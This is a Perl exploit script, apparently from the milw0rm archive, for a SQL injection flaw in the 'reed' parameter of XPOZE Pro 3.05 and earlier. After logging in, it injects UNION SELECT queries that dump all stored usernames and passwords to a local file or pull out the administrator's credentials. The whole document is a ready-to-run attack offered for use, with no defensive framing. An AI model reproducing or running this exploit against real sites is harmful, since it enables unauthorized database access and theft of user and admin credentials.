<html><head><title>XPOZE Pro <= 3.05 (reed) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

# - XPOZE Pro &lt;= 3.05 SQL Injection Exploit -
#     Coded And Discovered by t0pP8uZz

# Why a exploit? mainly to dump all users easyily.
# Lots of websites are reslling this script, so there is no suitable dork.

use strict;
use LWP::UserAgent;

print &quot;-------------------------------------------------\n&quot;;
print &quot;-     XPOZE Pro &lt;= 3.05 SQL Injection Exploit   -\n&quot;;
print &quot;-         Discovered &amp; Coded By t0pP8uZz        -\n&quot;;
print &quot;-     CipherCrew, h4ck-y0u.org, milw0rm.com     -\n&quot;;
print &quot;-------------------------------------------------\n\n&quot;;

print &quot;Enter URL (ie: http://xpoze.com/demo/): &quot;;
	chomp(my $url = &lt;STDIN&gt;);

print &quot;Enter Valid Username (register on target site first): &quot;;
	chomp(my $user = &lt;STDIN&gt;);

print &quot;Enter Valid Password (register on target site first): &quot;;
	chomp(my $pass = &lt;STDIN&gt;);

print &quot;Attack Type (enter 1 too dump all users, enter 2 too get admin details): &quot;;
	chomp(my $type = &lt;STDIN&gt;);

my $ua = LWP::UserAgent-&gt;new( agent =&gt; 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)', cookie_jar =&gt; {} );
my $response = $ua-&gt;post($url, {'username' =&gt; $user, 'password' =&gt; $pass, 'login' =&gt; 'Submit'});

if($response-&gt;is_success()) {

	if($type == 1) {
	
		my $res = $ua-&gt;get($url.&quot;/account/user/mail.html?reed=-1 UNION ALL SELECT 1,2,3,4,concat(0x3C313E,user,0x3a,pass,0x3C323E),6,7 FROM users/*&quot;);
		(my @users) = $res-&gt;content =~ /&lt;1&gt;(.*?)&lt;2&gt;/g;
		
		open(FILE, &quot;+&gt;&gt;C:\users.txt&quot;) or die (&quot;Error Writing Users To File!&quot;);
		
		foreach $user (@users) {
			print FILE $user.&quot;\r\n&quot;;
			print $user.&quot;\n&quot;;
		}
		close FILE;
		print &quot;Users Have Been Dumped To Local File 'C:\\users.txt'\n&quot;;
		
	} elsif($type == 2) {
	
		my $res = $ua-&gt;get($url.&quot;/account/user/mail.html?reed=-1 UNION ALL SELECT 1,2,3,4,concat(0x3C313E,user,0x3a,pass,0x3C323E),6,7 FROM users WHERE rank=0/*&quot;);
		(my @users) = $res-&gt;content =~ /&lt;1&gt;(.*?)&lt;2&gt;/;
		
		my @user = split(/:/, $users[0]);
		
		print &quot;\n\nAdmin Username: &quot;.$user[0];
		print &quot;\nAdmin Password: &quot;.$user[1];
		print &quot;\n\nDone!&quot;;
		
	} else { print &quot;Invalid Attack Type!&quot;; exit; }
} else { print &quot;Check username/password!&quot;; exit; }
exit;

# milw0rm.com [2008-04-04]</pre></html>